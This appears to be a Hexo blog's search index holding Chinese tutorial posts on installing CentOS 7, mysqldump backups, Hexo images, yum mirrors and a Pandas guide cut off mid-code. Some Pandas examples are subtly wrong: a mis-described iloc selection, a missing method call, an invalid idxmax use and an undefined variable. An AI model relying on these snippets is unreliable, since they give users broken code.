<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>我的第一篇博客</title>
    <url>/posts/d95d7e09/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>这是我的第一篇博客，我以后会在这里分享一些技术，生活或记录学习状况。</p>
<p>同时我也会吸取一些建议或意见，进行修正。</p>
]]></content>
      <categories>
        <category>分享</category>
      </categories>
      <tags>
        <tag>记录</tag>
      </tags>
  </entry>
  <entry>
    <title>Centos7 的安装与配置 - 1</title>
    <url>/posts/88be706e/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h3 id="下载镜像">下载镜像</h3>
<p>以下内容仅按照我的配置写的，如有不足评论一下。</p>
<p>首先下载Centos7的镜像，这里我用的 <a href="https://mirrors.aliyun.com/centos/">阿里云的镜像</a></p>
<p><img src="1.png" alt=""></p>
<p>进入 7.9.2009/isos/x86_64/，下载 <a href="https://mirrors.aliyun.com/centos/7.9.2009/isos/x86_64/CentOS-7-x86_64-NetInstall-2009.iso">CentOS-7-x86_64-NetInstall-2009.iso</a></p>
<p><img src="2.png" alt=""></p>
<p>如果打开只有一个 readme 文件，说明这个版本的镜像没有提供下载。</p>
<p><img src="3.png" alt=""></p>
<h3 id="安装">安装</h3>
<p>首先打开 VMware，创建新的虚拟机，这里安装到虚拟机里面 (物理机应该也是一样的)</p>
<p><img src="4.png" alt=""></p>
<p>选择自定义(高级)，然后下一步</p>
<p><img src="5.png" alt=""></p>
<p><img src="6.png" alt=""></p>
<p>这里选择稍后安装操作系统，然后下一步</p>
<p><img src="7.png" alt=""></p>
<p>这里选择Centos7 64位</p>
<p><img src="8.png" alt=""></p>
<p>这里可以给虚拟机起名字。</p>
<p>位置选C盘以外的盘，因为最后生成的虚拟机文件比较大(只有一个C盘当我没说…)</p>
<p><img src="9.png" alt=""></p>
<p>这里可以设置虚拟机的处理器(不懂别瞎选，默认的就行)</p>
<p><img src="10.png" alt=""></p>
<p>这里设置内存(不懂别瞎选，默认的就行)</p>
<p><img src="11.png" alt=""></p>
<p>这里建议选默认的 使用网络地址转换(NAT)</p>
<p><img src="12.png" alt=""></p>
<p>后面的默认推荐就可以</p>
<p><img src="13.png" alt=""><br>
<img src="14.png" alt=""></p>
<p>创建新虚拟磁盘，而后下一步</p>
<p><img src="15.png" alt=""></p>
<p>这里可以设置磁盘大小，也就是虚拟机的硬盘大小</p>
<p>选 将虚拟磁盘存储为单个文件，而后下一步</p>
<p><img src="16.png" alt=""><br>
<img src="17.png" alt=""></p>
<p>完成！</p>
<p><img src="18.png" alt=""><br>
<img src="19.png" alt=""></p>
]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>Centos7</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL的备份与恢复 (mysqldump)</title>
    <url>/posts/4394775c/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="mysqldump-语法">mysqldump 语法</h2>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysqldump [选项] 数据库名 [表名] <span class="operator">&gt;</span> 脚本.<span class="keyword">sql</span></span><br></pre></td></tr></table></figure>
<h3 id="选项">选项</h3>
<table>
<thead>
<tr>
<th>参数名</th>
<th>缩写</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>--host</td>
<td>-h</td>
<td>服务器IP地址</td>
</tr>
<tr>
<td>--port</td>
<td>-P (大写)</td>
<td>服务器端口号</td>
</tr>
<tr>
<td>--password</td>
<td>-p (小写)</td>
<td>MySQL密码</td>
</tr>
<tr>
<td>--databases</td>
<td></td>
<td>指定要备份的数据库</td>
</tr>
<tr>
<td>--all-databases</td>
<td></td>
<td>备份MySQL服务器上的所有数据库</td>
</tr>
<tr>
<td>--compact</td>
<td></td>
<td>压缩模式，产生更少的输出</td>
</tr>
<tr>
<td>--comments</td>
<td></td>
<td>添加注释信息</td>
</tr>
<tr>
<td>--complete-insert</td>
<td></td>
<td>输出完成的插入语句</td>
</tr>
<tr>
<td>--lock-tables</td>
<td></td>
<td>备份前，锁定所有数据库表</td>
</tr>
<tr>
<td>--no-create-db/–no-create-info</td>
<td></td>
<td>禁止生成创建数据库语句</td>
</tr>
<tr>
<td>--force</td>
<td></td>
<td>当出现错误时仍然继续备份操作</td>
</tr>
<tr>
<td>--default-character-set</td>
<td></td>
<td>指定默认字符集</td>
</tr>
<tr>
<td>--add-locks</td>
<td></td>
<td>备份数据库表时锁定数据库表</td>
</tr>
</tbody>
</table>
<h2 id="示例">示例</h2>
<p>如果 -p 选项没有指定密码，那么控制台会等待输入密码</p>
<h3 id="备份所有数据库">备份所有数据库</h3>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysqldump <span class="operator">-</span>uroot <span class="operator">-</span>p <span class="comment">--all-databases &gt; all.sql</span></span><br></pre></td></tr></table></figure>
<h3 id="备份指定数据库">备份指定数据库</h3>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysqldump <span class="operator">-</span>uroot <span class="operator">-</span>p test <span class="operator">&gt;</span> test.sql</span><br></pre></td></tr></table></figure>
<h3 id="备份指定数据库指定表-多个表以空格间隔">备份指定数据库指定表(多个表以空格间隔)</h3>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysqldump <span class="operator">-</span>uroot <span class="operator">-</span>p test table1 table2 <span class="operator">&gt;</span> test.sql </span><br></pre></td></tr></table></figure>
<h3 id="备份指定数据库排除某些表">备份指定数据库排除某些表</h3>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysqldump <span class="operator">-</span>uroot <span class="operator">-</span>p test <span class="comment">--ignore-table=test.table1 --ignore-table=test.table2 &gt; test.sql</span></span><br></pre></td></tr></table></figure>
<h2 id="恢复命令">恢复命令</h2>
<h3 id="命令行命令">命令行命令</h3>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">注：在导入备份数据库前，db_name如果没有，是需要创建的； 而且与db_name.sql中数据库名是一样的才可以导入。</span><br><span class="line">mysqladmin <span class="operator">-</span>uroot <span class="operator">-</span>p <span class="keyword">create</span> db_name </span><br><span class="line">mysql <span class="operator">-</span>uroot <span class="operator">-</span>p db_name <span class="operator">&lt;</span> <span class="operator">/</span>backup<span class="operator">/</span>mysqldump<span class="operator">/</span>db_name.sql</span><br></pre></td></tr></table></figure>
<h3 id="soure-方法">soure 方法</h3>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql <span class="operator">&gt;</span> use db_name</span><br><span class="line">mysql <span class="operator">&gt;</span> source <span class="operator">/</span>backup<span class="operator">/</span>db_name.sql</span><br></pre></td></tr></table></figure>
<style>
    table th:nth-child(2){
        width: 5rem;
    }
</style>]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>SQL</tag>
        <tag>MySQL</tag>
        <tag>备份</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo 图片资源显示</title>
    <url>/posts/a6886184/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h3 id="安装-hexo-renderer-markdown-it">安装 hexo-renderer-markdown-it</h3>
<p><a href="https://github.com/hexojs/hexo-renderer-markdown-it/">hexo-renderer-markdown-it官网</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 如果安装过 hexo-renderer-marked，就卸载</span></span><br><span class="line"></span><br><span class="line">npm un hexo-renderer-marked</span><br><span class="line"></span><br><span class="line">npm i hexo-renderer-markdown-it</span><br></pre></td></tr></table></figure>
<h3 id="修改-config-yml">修改_config.yml</h3>
<p>将 post_asset_folder 改为true</p>
<p><img src="1.png" alt=""></p>
<h3 id="重新生成静态文件，并运行">重新生成静态文件，并运行</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo clean &amp; hexo g &amp; hexo server</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>bug</tag>
      </tags>
  </entry>
  <entry>
    <title>换 yum 源</title>
    <url>/posts/241dfea9/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>备份原有源配置文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">mv</span> /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.backup</span><br></pre></td></tr></table></figure>
<p>下载国内源配置文件(这里用的是阿里云的仓库)，并移动到源目录里</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> curl -O http://mirrors.aliyun.com/repo/Centos-7.repo</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">mv</span> Centos-7.repo /etc/yum.repos.d/CentOS-Base.repo</span><br></pre></td></tr></table></figure>
<p>刷新yum缓存</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> yum clean all</span><br><span class="line"><span class="built_in">sudo</span> yum makecache fast</span><br></pre></td></tr></table></figure>
<p>检查是否更换成功</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> yum repolist</span><br></pre></td></tr></table></figure>
<p>更新软件包</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum -y update</span><br></pre></td></tr></table></figure>
<p>至此，换源完成~</p>
]]></content>
      <categories>
        <category>配置</category>
      </categories>
      <tags>
        <tag>Centos7</tag>
        <tag>Linux</tag>
        <tag>配置</tag>
        <tag>config</tag>
        <tag>yum</tag>
      </tags>
  </entry>
  <entry>
    <title>Centos7 的安装与配置 - 2</title>
    <url>/posts/11b721d4/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>右键标签栏，点击设置</p>
<p><img src="1.png" alt=""></p>
<p>选择 CD/DVD，选择下载好的ISO镜像，点击确定</p>
<p><img src="2.png" alt=""></p>
<p>开机！</p>
<p><img src="3.png" alt=""></p>
<p>开机之后，用方向键选择 Install Centos7 选项，按回车确认</p>
<p><img src="4.png" alt=""></p>
<p>选择语言</p>
<p><img src="5.png" alt=""></p>
<p>下滑选择安装位置</p>
<p><img src="6.png" alt=""></p>
<p>不会配置的选下面的自动配置分区，而后点击完成</p>
<p><img src="7.png" alt=""></p>
<p>配置安装源</p>
<p><img src="8.png" alt=""></p>
<p>如果配置是灰色的话，就像这样，就是没有连接网络，需要先连一下网络</p>
<p>点击完成回到刚才的页面</p>
<p><img src="9.png" alt=""></p>
<p>点击网络和主机名</p>
<p><img src="10.png" alt=""><br>
<img src="11.png" alt=""></p>
<p>连接到网络后，再次配置安装源，将安装源设置为国内的。</p>
<p><a href="http://mirrors.aliyun.com/centos/7/os/x86_64/">http://mirrors.aliyun.com/centos/7/os/x86_64/</a></p>
<p><img src="12.png" alt=""></p>
<p>软件选择</p>
<p><img src="13.png" alt=""></p>
<p>这里我选择的是最小安装，方便学习和记录</p>
<p><img src="14.png" alt=""><br>
<img src="15.png" alt=""></p>
<p>在安装过程中可以根据需求来判断是否设置root密码或者创建用户</p>
<p>我不需要创建用户，所以我没有创建</p>
<p>漫长的等待……</p>
<p><img src="16.png" alt=""></p>
<p>Centos7！启动！！</p>
<p><img src="17.png" alt=""></p>
<p>输入你的用户名和密码</p>
<p>没有创建用户的话就只有root用户</p>
<p><img src="18.png" alt=""></p>
<p>这样就装好了~</p>
<p><img src="19.png" alt=""></p>
]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>Centos7</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Pandas 库的使用</title>
    <url>/posts/1701cff7/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>本文按照pandas文档来总结的，如果有错误的地方，欢迎指正<br>
<a href="https://pandas.ac.cn/docs/">https://pandas.ac.cn/docs/</a></p>
<h3 id="安装-pandas">安装 pandas</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install pandas</span><br></pre></td></tr></table></figure>
<h3 id="导入-pandas">导入 pandas</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br></pre></td></tr></table></figure>
<h3 id="读取表格或数据库">读取表格或数据库</h3>
<p>数据库以MySQL为例</p>
<p>支持相对路径，绝对路径，网络路径</p>
<p>读取操作返回DataFrame</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在读取的时候添加parse_dates=[&quot;列名&quot;]，可使这个列变为Timestamp类型</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取csv表格文件</span></span><br><span class="line">pd.read_csv(<span class="string">&quot;data.csv&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取xlsx或者xls表格文件</span></span><br><span class="line">pd.read_excel(<span class="string">&quot;data.xlsx&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取MySQL</span></span><br><span class="line"><span class="comment"># 首先创建数据库连接对象</span></span><br><span class="line">conn = pymysql.connect(</span><br><span class="line">    host=<span class="string">&quot;localhost&quot;</span>, <span class="comment"># 数据库地址</span></span><br><span class="line">    port=<span class="number">3306</span>, <span class="comment"># 数据库端口</span></span><br><span class="line">    user=<span class="string">&quot;root&quot;</span>, <span class="comment"># 登录用户名</span></span><br><span class="line">    password=<span class="string">&quot;123456&quot;</span>, <span class="comment"># 登录密码</span></span><br><span class="line">    database=<span class="string">&quot;example&quot;</span>, <span class="comment"># 数据库名称</span></span><br><span class="line">    charset=<span class="string">&quot;utf8&quot;</span> <span class="comment"># 编码格式</span></span><br><span class="line">)</span><br><span class="line"><span class="comment">#执行sql操作</span></span><br><span class="line"><span class="comment"># %s 是占位符, index_col 是索引字段,可以是字符串也可以是列表</span></span><br><span class="line">sql = <span class="string">&quot;select * from user limit %s,%s&quot;</span></span><br><span class="line">pd.read_sql(sql,con=conn,params=[<span class="number">10</span>,<span class="number">20</span>],index_col=[<span class="string">&quot;id&quot;</span>,<span class="string">&quot;type&quot;</span>])</span><br></pre></td></tr></table></figure>
<h3 id="写入表格">写入表格</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 写 csv 文件</span></span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取read.csv表格</span></span><br><span class="line">data_read = pd.read_csv(<span class="string">&quot;read.csv&quot;</span>)</span><br><span class="line"><span class="comment"># 将read.csv表格写入到write.csv表格,并去除索引,在写入时不能打开write.csv</span></span><br><span class="line">data_read.to_csv(<span class="string">&quot;write.csv&quot;</span>,index=<span class="literal">False</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment"># 将read.csv表格写入到write.txt文件里，并设置分割方式，去除索引,在写入时不能打开write.txt</span></span><br><span class="line">data_read.to_csv(<span class="string">&quot;write.txt&quot;</span>,sep=<span class="string">&quot;\t&quot;</span>,index=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将read.csv表格写入到write.xlsx表格,并去除索引,在写入时不能打开write.xlsx</span></span><br><span class="line">data_read.to_excel(<span class="string">&quot;write.xlsx&quot;</span>,index=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
<h3 id="选择-DataFrame-的子集">选择 DataFrame 的子集</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line">data = pd.read_csv(<span class="string">&quot;data.csv&quot;</span>)</span><br></pre></td></tr></table></figure>
<h4 id="选择数值列">选择数值列</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data.describe()</span><br></pre></td></tr></table></figure>
<h4 id="选择特定列">选择特定列</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 选择Age列</span></span><br><span class="line">ages = data[<span class="string">&quot;Age&quot;</span>]</span><br><span class="line">ages.head()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 选择Name列和Age列</span></span><br><span class="line">name_age = data[[<span class="string">&quot;Name&quot;</span>,<span class="string">&quot;Age&quot;</span>]]</span><br><span class="line">name_age.head()</span><br></pre></td></tr></table></figure>
<h4 id="选择特定行">选择特定行</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 筛选年龄超过35岁的乘客</span></span><br><span class="line"><span class="comment"># data[&quot;Age&quot;] &gt; 35 将判断每一条数据的Age字段是否大于35</span></span><br><span class="line">ages = data[data[<span class="string">&quot;Age&quot;</span>] &gt; <span class="number">35</span>]</span><br><span class="line">ages.head()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 筛选泰坦尼克号 2 等舱和 3 等舱的乘客</span></span><br><span class="line"><span class="comment"># 第一种写法</span></span><br><span class="line">class_23 = data[data[<span class="string">&quot;class&quot;</span>].isin([<span class="number">2</span>,<span class="number">3</span>])]</span><br><span class="line"><span class="comment"># 第二种写法</span></span><br><span class="line"><span class="comment"># 注: 不能用 or/and,需要用or运算符 | 和and运算符 &amp;</span></span><br><span class="line">class_23 = data[(data[<span class="string">&quot;class&quot;</span>] == <span class="number">2</span>) | (data[<span class="string">&quot;class&quot;</span>] == <span class="number">3</span>)]</span><br><span class="line">class_23.head()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取已知年龄的乘客数据</span></span><br><span class="line">ages_no_na = data[data[<span class="string">&quot;Age&quot;</span>].notna()]</span><br><span class="line">ages_no_na.head() </span><br></pre></td></tr></table></figure>
<h4 id="选择特定的行和列">选择特定的行和列</h4>
<p>需要在选择括号 [] 前面使用 loc/iloc 运算符。使用 loc/iloc 时，逗号前面的部分是要选择的行，逗号后面的部分是要选择的列</p>
<p>loc是基于行标签和列标签进行索引的，基本用法为 DataFrame.loc[行标签,列标签]<br>
iloc是基于行和列的位置进行索引的，索引从0开始，基本用法为 DataFrame.iloc[行位置,列位置]</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 年龄大于35岁的乘客的姓名</span></span><br><span class="line">names = data.loc[data[<span class="string">&quot;Age&quot;</span>] &gt; <span class="number">35</span>,<span class="string">&quot;Name&quot;</span>]</span><br><span class="line">names.head()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取第十行到30行的数据</span></span><br><span class="line">datas = data.iloc[<span class="number">9</span>,<span class="number">30</span>]</span><br><span class="line">datas.head()</span><br></pre></td></tr></table></figure>
<h3 id="从现有列创建新列">从现有列创建新列</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line">data = pd.read_csv(<span class="string">&quot;data.csv&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建Age2列，值为Age列的2倍</span></span><br><span class="line">data[<span class="string">&#x27;Age2&#x27;</span>] = data[<span class="string">&#x27;Age&#x27;</span>] * <span class="number">2</span></span><br></pre></td></tr></table></figure>
<h3 id="修改列名称">修改列名称</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line">data = pd.read_csv(<span class="string">&quot;data.csv&quot;</span>)</span><br><span class="line"></span><br><span class="line">data.rename(</span><br><span class="line">    columns=&#123;</span><br><span class="line">        <span class="string">&quot;现有列名称&quot;</span>:<span class="string">&quot;新名称&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Age&quot;</span>:<span class="string">&quot;年龄&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>:<span class="string">&quot;姓名&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 也可以映射</span></span><br><span class="line">data.rename(columns=<span class="built_in">str</span>.lower)</span><br></pre></td></tr></table></figure>
<h3 id="计算汇总统计量">计算汇总统计量</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line">data = pd.read_csv(<span class="string">&quot;data.csv&quot;</span>)</span><br></pre></td></tr></table></figure>
<h4 id="平均值">平均值</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data[<span class="string">&quot;Age&quot;</span>].mean()</span><br></pre></td></tr></table></figure>
<h4 id="中位数">中位数</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data[<span class="string">&quot;Price&quot;</span>].median()</span><br></pre></td></tr></table></figure>
<h4 id="特定组合">特定组合</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data.agg(</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;Age&quot;</span>: [<span class="string">&quot;min&quot;</span>,<span class="string">&quot;max&quot;</span>,<span class="string">&quot;median&quot;</span>,<span class="string">&quot;skew&quot;</span>],</span><br><span class="line">        <span class="string">&quot;Fare&quot;</span>: [<span class="string">&quot;min&quot;</span>,<span class="string">&quot;max&quot;</span>,<span class="string">&quot;median&quot;</span>,<span class="string">&quot;mean&quot;</span>]</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<h4 id="按类别分组的汇总统计量">按类别分组的汇总统计量</h4>
<p>1、男性和女性泰坦尼克号乘客的平均年龄是多少？</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 先查询出Sex字段和Age字段的数据，然后将数据根据Sex分组，最后求年龄的平均值</span></span><br><span class="line">data[[<span class="string">&#x27;Sex&#x27;</span>,<span class="string">&#x27;Age&#x27;</span>]].groupby(<span class="string">&quot;Sex&quot;</span>).mean()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果没有显式的选择Sex和Age两列，那么就需要使用numeric_only=True应用包含数值列的每一项</span></span><br><span class="line">data.groupby(<span class="string">&quot;Sex&quot;</span>).mean(numeric_only=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 也可以对分组数据的列选择</span></span><br><span class="line">data.groupby(<span class="string">&quot;Sex&quot;</span>)[<span class="string">&#x27;Age&#x27;</span>].mean()</span><br></pre></td></tr></table></figure>
<p>2、每个性别和客舱等级组合的平均票价是多少？</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data.groupby([<span class="string">&quot;Sex&quot;</span>,<span class="string">&quot;Pclass&quot;</span>])[<span class="string">&#x27;Fare&#x27;</span>].mean()</span><br></pre></td></tr></table></figure>
<h4 id="按类别统计记录数">按类别统计记录数</h4>
<p>1、每个客舱等级有多少乘客？</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># value_counts是一个快捷方式，它实际上是分组操作与每个组内记录数的计数相结合</span></span><br><span class="line"><span class="comment"># 两个相同</span></span><br><span class="line">data[<span class="string">&#x27;Pclass&#x27;</span>].value_counts()</span><br><span class="line">data.groupby(<span class="string">&quot;Pclass&quot;</span>)[<span class="string">&#x27;Pclass&#x27;</span>].count()</span><br><span class="line"></span><br><span class="line"><span class="comment"># size 和 count 都可以与 groupby 结合使用。而 size 包含 NaN 值，只提供行数（表格的大小），count 排除缺失值。在 value_counts 方法中，使用 dropna 参数来包含或排除 NaN 值。</span></span><br><span class="line">data.groupby(<span class="string">&quot;Pclass&quot;</span>)[<span class="string">&#x27;Pclass&#x27;</span>].size()</span><br></pre></td></tr></table></figure>
<h3 id="排序">排序</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 根据Age进行排序</span></span><br><span class="line"><span class="comment"># 基本用法: sort_values(by,axis,ascending,inplace,kind,na_position)</span></span><br><span class="line"><span class="comment"># by: 根据哪一列排序,可以为一个列表</span></span><br><span class="line"><span class="comment"># axis: 轴来指导排序</span></span><br><span class="line"><span class="comment"># ascending: 如果为真，按升序排序，否则按降序排序</span></span><br><span class="line"><span class="comment"># inplace: 如果为真，就地执行操作</span></span><br><span class="line"><span class="comment"># kind: 选择排序算法</span></span><br><span class="line"><span class="comment"># na_position: 参数&#x27;first&#x27;将NaNs放在开头，&#x27;last&#x27;将NaNs放在结尾</span></span><br><span class="line">titanic.sort_values(by=<span class="string">&quot;Age&quot;</span>).head()</span><br><span class="line"><span class="comment"># sort_index和sort_value基本相似,只是一个按索引排序，一个按字段排序</span></span><br></pre></td></tr></table></figure>
<h3 id="数据重塑">数据重塑</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># pivot(data,columns,index,values)</span></span><br><span class="line"><span class="comment"># data: 数据帧</span></span><br><span class="line"><span class="comment"># columns: str | object | str列表，用于创建新框架的列的列</span></span><br><span class="line"><span class="comment"># index: str | object | str列表，可选，用于创建新帧索引的Column，如果未给出，则使用现有索引</span></span><br><span class="line"><span class="comment"># values: str、对象或上一个列表，可选，用于填充新帧值的列，如果不指定，则将使用所有剩余列，结果将具有分层索引列</span></span><br><span class="line"><span class="comment"># 返回重塑的DataFrame</span></span><br><span class="line">data.pivot()</span><br></pre></td></tr></table></figure>
<h3 id="透视表">透视表</h3>
<p>在 pivot() 的情况下，数据只是重新排列。当需要聚合多个值时，可以使用 pivot_table()，它提供一个聚合函数（例如平均值）来组合这些值。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data.pivot_table(values=<span class="string">&quot;value&quot;</span>, index=<span class="string">&quot;location&quot;</span>, columns=<span class="string">&quot;parameter&quot;</span>, aggfunc=<span class="string">&quot;mean&quot;</span>)</span><br></pre></td></tr></table></figure>
<h3 id="创建新索引">创建新索引</h3>
<p>reset_index()</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data.pivot(columns=<span class="string">&quot;location&quot;</span>, values=<span class="string">&quot;value&quot;</span>).reset_index()</span><br></pre></td></tr></table></figure>
<h3 id="合并">合并</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data1 = pd.read_csv(<span class="string">&quot;data1.csv&quot;</span>)</span><br><span class="line">data2 = pd.read_csv(<span class="string">&quot;data2.csv&quot;</span>)</span><br><span class="line">pd.concat([data1,data2],axis=<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<h3 id="merge">merge</h3>
<p>基本用法: merge(left,right,how,on,left_on,right_on,left_index,right_index,sort,suffixes,copy,indicator,validate)</p>
<p>详细解释见: <a href="https://pandas.pydata.org/docs/reference/api/pandas.merge.html#pandas.merge">https://pandas.pydata.org/docs/reference/api/pandas.merge.html#pandas.merge</a></p>
<h3 id="时间序列数据">时间序列数据</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pd.to_datetime(data[<span class="string">&quot;datetime&quot;</span>])</span><br></pre></td></tr></table></figure>
<h3 id="操作文本">操作文本</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 将Name字段的所有内容全部转为小写</span></span><br><span class="line">data[<span class="string">&#x27;Name&#x27;</span>].<span class="built_in">str</span>.lower</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分割Name字段的所有内容</span></span><br><span class="line">data[<span class="string">&#x27;Name&#x27;</span>].<span class="built_in">str</span>.split(<span class="string">&quot;,&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 基本用法: contains(pat,case,flags,na,regex)</span></span><br><span class="line"><span class="comment"># pat: 字符串或正则</span></span><br><span class="line"><span class="comment"># case: 是否区分大小写，默认True</span></span><br><span class="line"><span class="comment"># flags: 默认0，传递给 re 模块的标志，例如 re.IGNORECASE 的 CASE。</span></span><br><span class="line"><span class="comment"># na: 可选,默认对空值不处理，即输出结果还是nan</span></span><br><span class="line"><span class="comment"># 文本包含,是否包含Countess字符串，包含返回True，不包含返回False，NaN返回NaN</span></span><br><span class="line">data[<span class="string">&#x27;Name&#x27;</span>].<span class="built_in">str</span>.contains(<span class="string">&quot;Countess&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取Name长度</span></span><br><span class="line">data[<span class="string">&#x27;Name&#x27;</span>].<span class="built_in">str</span>.<span class="built_in">len</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取名字最长的那一个Name</span></span><br><span class="line">data.loc[data[<span class="string">&#x27;Name&#x27;</span>].<span class="built_in">str</span>.idxmax(),<span class="string">&quot;Name&quot;</span>]</span><br><span 